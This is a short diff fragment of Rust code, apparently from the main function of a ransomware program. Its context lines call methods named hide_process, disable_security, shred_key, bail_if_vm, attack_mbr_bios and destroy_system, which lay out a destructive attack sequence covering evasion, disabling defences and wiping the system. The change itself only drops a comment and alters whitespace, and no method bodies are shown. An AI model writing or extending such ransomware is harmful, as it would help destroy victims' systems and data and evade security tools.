     ransomware.hide_process()?;
     ransomware.disable_security()?;
@@ -633,6 +830,6 @@ fn main() -> Result<(), io::Error> {
     ransomware.shred_key()?;
     ransomware.bail_if_vm()?;
     ransomware.attack_mbr_bios()?;
-    ransomware.destroy_system()?;  // Added as final step
+    ransomware.destroy_system()?;
     Ok(())
-}  
+}            
